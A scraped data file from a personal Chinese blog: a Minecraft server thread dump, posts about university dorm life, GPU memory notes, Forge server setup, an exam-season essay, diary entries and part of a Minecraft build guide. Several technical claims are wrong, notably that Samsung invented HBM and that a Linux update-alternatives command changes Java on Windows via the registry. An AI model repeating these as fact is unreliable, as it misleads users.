io.netty.channel.nio.SelectedSelectionKeySet@3753e19d- locked java.util.Collections$UnmodifiableSet@147ed2ec- locked sun.nio.ch.WindowsSelectorImpl@646134ffat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #10” Id=198 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@75d53838- locked java.util.Collections$UnmodifiableSet@5d226016- locked sun.nio.ch.WindowsSelectorImpl@3f2920ecat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #9” Id=166 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@52822d3a- locked java.util.Collections$UnmodifiableSet@e4acbaa- locked sun.nio.ch.WindowsSelectorImpl@40a628a5at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #8” Id=165 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@36fe4e1d- locked java.util.Collections$UnmodifiableSet@75565e05- locked sun.nio.ch.WindowsSelectorImpl@2d99dc9eat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #7” Id=124 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@5c0b2a88- locked java.util.Collections$UnmodifiableSet@184119b2- locked sun.nio.ch.WindowsSelectorImpl@5f20cac9at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #6” Id=72 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@3c3e809f- locked java.util.Collections$UnmodifiableSet@39e4a2fa- locked sun.nio.ch.WindowsSelectorImpl@2978a0fdat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #5” Id=70 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@70d75199- locked java.util.Collections$UnmodifiableSet@38a50d64- locked sun.nio.ch.WindowsSelectorImpl@244a9bf8at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #4” Id=69 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@48d9b8c4- locked java.util.Collections$UnmodifiableSet@2c873df- locked sun.nio.ch.WindowsSelectorImpl@129690cfat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #3” Id=61 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@62f34c3e- locked java.util.Collections$UnmodifiableSet@6769c73c- locked sun.nio.ch.WindowsSelectorImpl@267e0685at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #2” Id=54 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@48ea6d- locked java.util.Collections$UnmodifiableSet@7822d4e6- locked sun.nio.ch.WindowsSelectorImpl@51dbacf9at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #1” Id=53 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@7c7d269- locked java.util.Collections$UnmodifiableSet@401b5b7e- locked sun.nio.ch.WindowsSelectorImpl@2ef0327fat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Java2D Disposer” Id=51 WAITING on java.lang.ref.ReferenceQueue$Lock@2240ef3cat java.lang.Object.wait(Native Method)- waiting on java.lang.ref.ReferenceQueue$Lock@2240ef3cat java.lang.ref.ReferenceQueue.remove(Unknown Source)at java.lang.ref.ReferenceQueue.remove(Unknown Source)at sun.java2d.Disposer.run(Unknown Source)at java.lang.Thread.run(Unknown Source) “Server Watchdog” Id=50 RUNNABLEat sun.management.ThreadImpl.dumpThreads0(Native Method)at sun.management.ThreadImpl.dumpAllThreads(Unknown Source)at zj.run(SourceFile:45)at java.lang.Thread.run(Unknown Source) “Query Listener #1” Id=49 RUNNABLEat java.net.DualStackPlainDatagramSocketImpl.socketReceiveOrPeekData(Native Method)at java.net.DualStackPlainDatagramSocketImpl.receive0(Unknown Source)at java.net.AbstractPlainDatagramSocketImpl.receive(Unknown Source)- locked java.net.DualStackPlainDatagramSocketImpl@1bad2587at java.net.DatagramSocket.receive(Unknown Source)- locked java.net.DatagramPacket@1f75d27- locked java.net.DatagramSocket@2e3bf4acat adh.run(SourceFile:258)at java.lang.Thread.run(Unknown Source) “Netty Server IO #0” Id=46 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “ObjectCleanerThread” Id=45 TIMED_WAITING on java.lang.ref.ReferenceQueue$Lock@b27d758at java.lang.Object.wait(Native Method)- waiting on java.lang.ref.ReferenceQueue$Lock@b27d758at java.lang.ref.ReferenceQueue.remove(Unknown Source)at io.netty.util.internal.ObjectCleaner$1.run(ObjectCleaner.java:54)at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)at java.lang.Thread.run(Unknown Source) “DestroyJavaVM” Id=44 RUNNABLE “Server console handler” Id=43 RUNNABLE (in native)at java.io.FileInputStream.readBytes(Native Method)at java.io.FileInputStream.read(Unknown Source)at java.io.BufferedInputStream.read1(Unknown Source)at java.io.BufferedInputStream.read(Unknown Source)- locked java.io.BufferedInputStream@79545aa6at sun.nio.cs.StreamDecoder.readBytes(Unknown Source)at sun.nio.cs.StreamDecoder.implRead(Unknown Source)at sun.nio.cs.StreamDecoder.read(Unknown Source)- locked java.io.InputStreamReader@42f12eceat java.io.InputStreamReader.read(Unknown Source)… “Server thread” Id=40 RUNNABLEat java.util.stream.IntPipeline$4$1.accept(Unknown Source)at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)… “Snooper Timer” Id=41 WAITING on java.util.TaskQueue@331e3ca8at java.lang.Object.wait(Native Method)- waiting on java.util.TaskQueue@331e3ca8at java.lang.Object.wait(Unknown Source)at java.util.TimerThread.mainLoop(Unknown Source)at java.util.TimerThread.run(Unknown Source) “Timer hack thread” Id=32 TIMED_WAITINGat java.lang.Thread.sleep(Native Method)at x$6.run(SourceFile:636) “Attach Listener” Id=5 RUNNABLE “Signal Dispatcher” Id=4 RUNNABLE “Finalizer” Id=3 WAITING on java.lang.ref.ReferenceQueue$Lock@636a084at java.lang.Object.wait(Native Method)- waiting on java.lang.ref.ReferenceQueue$Lock@636a084at java.lang.ref.ReferenceQueue.remove(Unknown Source)at java.lang.ref.ReferenceQueue.remove(Unknown Source)at java.lang.ref.Finalizer$FinalizerThread.run(Unknown Source) “Reference Handler” Id=2 WAITING on java.lang.ref.Reference$Lock@5d6c4b8eat java.lang.Object.wait(Native Method)- waiting on java.lang.ref.Reference$Lock@5d6c4b8eat java.lang.Object.wait(Unknown Source)at java.lang.ref.Reference.tryHandlePending(Unknown Source)at java.lang.ref.Reference$ReferenceHandler.run(Unknown Source) Stacktrace:at zj.run(SourceFile:61)at java.lang.Thread.run(Unknown Source) -- System Details –Details:Minecraft Version: 1.16.2Minecraft Version ID: 1.16.2Operating System: Windows 10 (amd64) version 10.0Java Version: 1.8.0_141, Oracle CorporationJava VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle CorporationMemory: 4599614408 bytes (4386 MB) / 6228017152 bytes (5939 MB) up to 19088801792 bytes (18204 MB)CPUs: 32JVM Flags: 2 total; -Xms4G -Xmx20GPlayer Count: 2 / 20; [aah[‘Fever_King’/52754, l=’ServerLevel[world]‘, x=-116.44, y=121.00, z=-246.73], aah[‘Alpha___EX’/55209, l=’ServerLevel[world]‘, x=-491.94, y=188.00, z=193.01]]Data Packs: vanillaIs Modded: Unknown (can’t tell)Type: Dedicated Server (map_server.txt)","categories":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://zwh-china.github.io/categories/Minecraft/"}],"tags":[]},{"title":"CUIT生活体验","slug":"cuit生活体验","date":"2020-10-12T09:13:12.000Z","updated":"2021-04-20T21:15:38.443Z","comments":true,"path":"2020/10/12/cuit生活体验/","link":"","permalink":"https://zwh-china.github.io/2020/10/12/cuit%E7%94%9F%E6%B4%BB%E4%BD%93%E9%AA%8C/","excerpt":"","text":"写在前面，本内容纯属个人性质的感受和体验，仅代表我个人的观点和立场。作为20届新生开学一个月来的初步体验，为下一届航空港的新生提供有限的参考 先说学校的住宿，对于航空港的情况来说，没有4人间，只有6人间存在，航空港校区仅有的4人间是提供给研究生的。对于我所在的专业信息安全，女生也无一例外都是6人。寝室空间虽较小，但尚可接受。可是寝室有诸多设计不人性化的地方，例如两侧桌子与床固定，无法挪动，导致书本等物品掉落在柜子后时非常难捡到，同时桌面没有开孔，所以对于台式机同学非常不方便，本人尝试与校方沟通无果，辅导员表示因为没有打孔先例所以不予打孔批准。所以说台式机基本没可能。同时桌面空间比较小屏幕不建议4k，4k能够勉强放下但是因为书柜设计问题显示屏幕会被顶的很靠前，导致手没地方放。寝室整体装修比较新，整体环境还算不错，作为学校比较靠内的宿舍楼来说，晚上基本听不到飞机的噪音，这点不用因为学校临近机场而担心。热水的话，晚上一般来说11点后也会有，电的话时理论上24小时不断电，功率似乎没什么明显限制，实测吹风机，高功耗台式机没有问题。 对于饮食方面，据我短期观察学校1、2食堂似乎基本都没有带叶子青菜（快餐类），青菜基本局限于包菜，土豆丝一类。同时基本菜里都有点辣椒，但是不算太辣，属于尚可接受的范围。想要吃青菜，只能指望吃面时面汤中放的亮片生菜，这点的确有些不人性化。对于学校这两个食堂，无论是新生还是老生，基本都是更偏向于一食堂，认为一食堂更干净一些，也更好吃。但是无论如何食堂菜的味道都差不多。是在吃不习惯可以点外卖，美团上那个千味居黄焖鸡还不错。学校奶茶店还是比较多的，有蜜雪冰城，所以说奶茶之类饮品价格不算太贵。学校教学楼一楼也设有自动贩卖机。 对于体育设施配套，应该总体来说还凑合，对于乒乓球台来说有室内和室外，篮球是那种室外的一个一个的那种区块形式的篮球场，足球设施配套不太清楚，不做评价。 对于刚开学需要注意的坑，我们学校对于新生英语4.6级考试的资格不是按照高考成绩内定（至少我们这届不是），而是靠抢，学校会提前开放名额给大二以上学生，所以留给新生的名额就不多了，务必要抢。同时选体育课是需要抢的，我们这届有排球，乒乓球，篮球，太极，瑜伽，健美操，跆拳道，足球。乒乓球、篮球和足球属于相对热门，想要选这几个的同学务必时刻关注教务处的动态。我们这届是晚上12点开放，等我一觉起来啥都没了。所以这两俩是很坑的。同时开学后第一件事估计就是体检，体检人非常多，我们这届学校没有组织，只是给定了期限让我们抽空去，结果抽血，胸片人超级多多到你难以想象，所以务必及时赶早去完成这两个项目的检测。学校进出需要人脸识别，需携带身份证去图书馆录入，方可进出学校。PS.开学考勤查的严，不要旷课，否则… 对于高中初中都没有住宿经历的同学，第一个晚上可能有些难度过，因为你的室友可能会打呼噜，因为第一天嘛，搬行李都很累，所以如果你睡觉不能容忍任何声音，建议早点睡，否则等你的室友开始打呼噜（开炮），你就会彻夜不眠，极其难受。本人就体会到了这种难受，甚至无法入睡水群时找到一个同患难的同班同学，建议这类同学提前买一个降噪耳机，苹果的AirPods Pro效果还不错，呼噜声基本没了，晚上也还能休息好。 大一是有早操和晚自习的，晚自习到晚上9点，大学晚自习和高中还是有很大区别，你带个电脑去，带个平板，玩个手机，听歌音乐，不会有人说什么。早操的话就比较早了，基本没有溜号的可能，没法睡懒觉喽。 刚开学肯定会有不少人拉你办卡，我建议就办张电信的卡，学校电信的网还是不错的，就是教学楼手机网速会很慢，大型集会，网速基本也就是能勉强聊个QQ的水平。网络这块算是中规中矩吧，用电信还有个好处就是，不需要买破解版路由器，其他提供商的网络只能直插电脑，你若想用无线路由器就会发现自己上不了网，只能被迫去买所谓破解版路由器，当然如果你自己有技术破解，那当我没说。 既来之则安之，无论你是为何选择了这所学校，一定要向目标前进，不要因为环境而阻挡了你前进的脚步。","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"2020-9-2 大佬茶谈","slug":"2020-9-2-大佬茶谈","date":"2020-09-02T12:09:04.000Z","updated":"2021-04-20T21:15:38.441Z","comments":true,"path":"2020/09/02/2020-9-2-大佬茶谈/","link":"","permalink":"https://zwh-china.github.io/2020/09/02/2020-9-2-%E5%A4%A7%E4%BD%AC%E8%8C%B6%E8%B0%88/","excerpt":"","text":"1.GPU的特性在于它可以快速从GRAM读出大量数据并丢进流水线，以及在进行纹理采样等操作的时候可以在最不占用IO的情况下把纹理数据丢给每个流水线 2.gpu有多核多线程多simd组，shader其实就是写一个simd对象的过程，gpu并发就是这么起来的，核心上的每个线程指令都是simd的好多个具体目标，这里说的“核”的数量，其实是流水线的数量，而非类似cpu的核心 3.FAQ:你知道HBM，DDR，GDDR内存的区别吗？ HBM是三星发明的High Bandwidth Memory 特性是频率低，数据线多，有上千条，读一次就能读出几百几千个字节，缺点是布线和生产工艺极其复杂，设计难度极高，良品率低，优点是体积小发热低，能把性能相当于RTX2080Ti的显卡缩小到很小 硬件方面，实现颇为复杂，但主要还是和显存的设计息息相关，上述HBM和GDDR走的是完全不一样的路线 DDR内存，使用一条时钟信号线，它的两个边沿都有作用，可以处理一条读取或者写入的请求，而GDDR有两条时钟线，每条时钟线每个边沿都有作用，所以速度上又比DDR快两倍，DDR则比普通的DRAM快两倍，所以GDDR应该改名叫QDR，因为是四倍速动态内存，然而不管是SDRAM还是DDR还是GDDR还是HBM，作为其存储元件的电容器结构，它的物理速度极限其实就是200MHz封顶，所以本质上GDDR就是一种速度更快的内存 3.然后GPU不仅使用这样的内存，而且GPU读取内存的过程是连续读取写入，相当于同时打开N个Row然后一次性连续读写完并立即关闭，CPU操作内存的过程就不太一样了，一方面CPU并不一定都是按页操作内存的，因为有多线程信号的关系有时候需要越过缓存直接读写内存的某个字节（需要先打开Row再操作再关闭，另一方面CPU需要和外设争夺内存的使用权，需要使用锁，或者原子操作 4.GPU图形性能高，是因为IO效率高，可以迅速把大量数据装入流水线，同样的，一个流水线足够深的CPU，在使用足够快的独占动态内存的时候，配合专门设计的缓存模式和内存批量读写方式，是可以达到GPU性能的，更何况N卡的GPU默认使用低精度浮点数计算模型 5.gpu上面很大一部分就是这种compute单元，l1，l2的cache都出来了，然后单元上面还有寄存器，然后GPU的GDDR特别擅长迅速给这些单元填入数据 By 0xAA55 and 紫国传教士","categories":[{"name":"计算机知识","slug":"计算机知识","permalink":"https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"记录使用forge官方服务端开服的一次经历","slug":"记录使用forge官方服务端开服的一次经历","date":"2020-07-09T11:55:25.000Z","updated":"2021-04-20T21:15:38.439Z","comments":true,"path":"2020/07/09/记录使用forge官方服务端开服的一次经历/","link":"","permalink":"https://zwh-china.github.io/2020/07/09/%E8%AE%B0%E5%BD%95%E4%BD%BF%E7%94%A8forge%E5%AE%98%E6%96%B9%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%9C%8D%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/","excerpt":"","text":"坑：1）较早版本服务端甚至不支持java8只能用java7 2）java运行环境最好别听网上的改系统环境变量，如果安装了多个版本的 java可以在cmd利用指令update-alternatives –config java更改java指令默认使用的java，其核心原理是更改注册表中有关current environment等表的值 3）官方forge服务端jar少必要的lib而且这些lib并非是外置的forge自动创建并下载的lib而是嵌入在官方vanilla核心中的所以想要正常启动需要一并下载vanilla核心并重命名为minecraft_server.x.x.x.jar这样在启动forge官方jar时便可以使得相关依赖的库被inject和调用 4)官方API不再支持较低版本的MC这使得即使服务器开启正版验证，玩家仍然不会显示皮肤，无论是在单机还是多人游戏","categories":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://zwh-china.github.io/categories/Minecraft/"}],"tags":[]},{"title":"高考倒计时55天，深夜","slug":"高考倒计时55天，深夜写给自己","date":"2020-05-13T17:32:31.000Z","updated":"2021-04-20T21:15:38.437Z","comments":true,"path":"2020/05/14/高考倒计时55天，深夜写给自己/","link":"","permalink":"https://zwh-china.github.io/2020/05/14/%E9%AB%98%E8%80%83%E5%80%92%E8%AE%A1%E6%97%B655%E5%A4%A9%EF%BC%8C%E6%B7%B1%E5%A4%9C%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1/","excerpt":"","text":"12年学习生涯，即将迎来一个拐点。人生的十字路口就在眼前，彷徨，不知所措，是我此时的我。步入高中以来，最期待的便是学长学姐的高考，随着时间推移，高考倒计时的铁牌子被摆放到了校门口。倒计时的数字永远是一个递减函数，只减不增。但是偶尔一瞥，我总是觉得，哇！这才刚开始，还有100天我们才能享受因为高考带来的假期，还要熬100天。可是在太阳东升西落，天光晦明变换间，这100天也便所剩无几。成人礼，誓师大会，励志讲座，这总是高考前高三学长们要经历的流程。那时的我总是好奇的望向300米的操场，想象正在举行的活动是怎么样的。可是，在我仍在好奇之时，这些活动却都来到了我的面前。新冠疫情肆虐，开学后便是60来天的倒计时。此时此刻的我，觉得不可思议，怎么就轮到了我？为什么这么快？难道时间和我开了一个玩笑？可是，我回头看看我一路走来，我所留下的脚印，在成长的泥泞小径上确实连续的。时间总是线性的，但是在某个时刻，你会有一种，时间仿佛跳动了一般的感觉。对于你来说就如同一下子在日历上撕去了一沓过期的日子。从来到学校的第一个下午，身边的同学，便变得和往日不同。平常最爱起哄的同学安静了，喧闹的教学楼安静了，老师们批评同学的声音隐匿了。目光所至，都是伏案学习的同学。我变得彷徨，不知所措。这是我在硕大的教室头一回觉得无所适从，觉得自己是这么不合群。在复学来的第一次考试铃响的那一刻，我忽然意识到我的成绩每次总是不理想，可身边的同学的成绩却都稳步向前。坐在考场上的我不知该怎么办，再一次回头，我才真正的明白了，自我的放纵，是今天彷徨的原因。无所适从是因为自己从来就没认清，自己的定位。可是无论如何，只有这么些日子了，时间就如同我高一时所关注的倒计时牌子上的数字一样，一眨眼变会飞过，唯一的不同，便是这次的倒计时的的确确是给我准备的。那既然这样，过去的无法弥补，现在的我只能选择抓住现在我能抓住的。排除万难做自己想做的事，纵然就算这样我仍然没法进步，甚至仍然是继续退步，我能够有资格说我对得起当下。在未来的某一天，回顾成长那条不归路，回首时间那个只会单调递增的函数，我能够在心里告诉自己，曾经有那么一段路，有那么一个区间，我做了我想要做的，而非逃避，亦或是困于现实的骨感，没能做到自己想做的……想到这里，此刻的我便也不再彷徨，因为此刻的我总算在这最后的时刻找到了自己的座位，尽管公交车也许已经到了终点站，但是这个终点站，也许不过是转乘下一辆公交车的中转站罢了。前路漫漫，未来总是处在迷离的叠加态迷雾中，可是山高水遥，路，总在那里，等着我留下自己的印子。 2020.5.14 凌晨1:30有感而发","categories":[{"name":"成长路上写给自己","slug":"成长路上写给自己","permalink":"https://zwh-china.github.io/categories/%E6%88%90%E9%95%BF%E8%B7%AF%E4%B8%8A%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1/"}],"tags":[]},{"title":"闲游牛头山国家森林公园","slug":"闲游牛头山国家森林公园","date":"2020-05-04T10:42:44.000Z","updated":"2021-04-20T21:15:38.436Z","comments":true,"path":"2020/05/04/闲游牛头山国家森林公园/","link":"","permalink":"https://zwh-china.github.io/2020/05/04/%E9%97%B2%E6%B8%B8%E7%89%9B%E5%A4%B4%E5%B1%B1%E5%9B%BD%E5%AE%B6%E6%A3%AE%E6%9E%97%E5%85%AC%E5%9B%AD/","excerpt":"","text":"时间：2020/5/3 上午8点左右 地点：牛头山国家森林公园 感想：疫情期间在家宅了这么久，有机会呼吸一下新鲜空气，在树荫下散步，真是非常不错的体验","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"复学前的核酸检测","slug":"复学前的核酸检测","date":"2020-05-04T10:34:20.000Z","updated":"2021-04-20T21:15:38.434Z","comments":true,"path":"2020/05/04/复学前的核酸检测/","link":"","permalink":"https://zwh-china.github.io/2020/05/04/%E5%A4%8D%E5%AD%A6%E5%89%8D%E7%9A%84%E6%A0%B8%E9%85%B8%E6%A3%80%E6%B5%8B/","excerpt":"","text":"时间：2020/5/3下午3点 地点：东风高级中学 活动：开学前核酸检测 感想：这酸爽只有体验了才知道，那根采样的鼻咽拭子居然能捅的那么深。。","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"关于制作世界吞噬者（基于ilmango）的一些心得","slug":"关于制作世界吞噬者的一些心得","date":"2020-05-02T13:55:42.000Z","updated":"2021-04-20T21:15:38.433Z","comments":true,"path":"2020/05/02/关于制作世界吞噬者的一些心得/","link":"","permalink":"https://zwh-china.github.io/2020/05/02/%E5%85%B3%E4%BA%8E%E5%88%B6%E4%BD%9C%E4%B8%96%E7%95%8C%E5%90%9E%E5%99%AC%E8%80%85%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"注意：由于本人水平有限，本部分内容均为个人学习体会，如有错误欢迎大家指正 前言：关于制作世界吞噬者的目的，世吞是清空区块制造空置域的装置之一。空置域可以认为就是一块没有多余方块的区域，一个没有使用的空置域往往是一个只有基岩的区域。空置域的好处就是可以在生存模式下，使得刷怪塔等装置的效率最大化，因为周围都是基岩的缘故刷怪只能在玩家做好的刷怪塔的不透明实体方块上，这样就能使得刷怪尝试的成功率最大化，进而达到优化效率的目的。同时由于其‘空’的特性，一些大型红石机械也会考虑建造在空置域中，例如全物品，来以此达到减少服务器和客户端卡顿的目的，就比如你玩超平坦和普通世界流畅度的差别一样。 优点：世吞相比于现在的普通单向轰炸机和三向轰炸机的优点就在于，世吞具有排水机，能够在轰炸过程中清理水和岩浆，省去玩家清理岩浆和水所需要的时间，轰炸的理论效率很高。并且其一旦开机理论上便可挂机相当久，不像单向轰炸机和三向轰炸机，往往需要炸两次才能达到效果。 缺点：个人认为世吞的缺点还是很明显的，首先就是在服务器的挂机很容易掉线（掉线原因很多就不在此处赘述），掉线后维修相当麻烦。同时没法实现全自动，黑曜石没法破除（在所难免）。前期准备较为麻烦，建造过程要求精细度较高，需要考虑多方面因素可能对机器造成影响。同时耗材很多，前期不适合建造。不要做的太大，极其怕弱加载或者区块卸载！！！ 构成：大体上分为出发和返回两部分，其中又可以细分为 ： 1）TNT复制模块：和大部分轰炸机一样世吞的核心也是最普通的TNT复制机，通过复制TNT来达到轰炸目的2）排水机模块：伴随轰炸机，作为轰炸机的跟班清理水或者岩浆。3）控制杆：连接轰炸机和排水机的一根柱子4）排水机出发延时装置：本质上是一个往返的史莱姆飞行器5）无延时连杆：听起来高大上实际上就是一个史莱姆长条，保证各组件下降 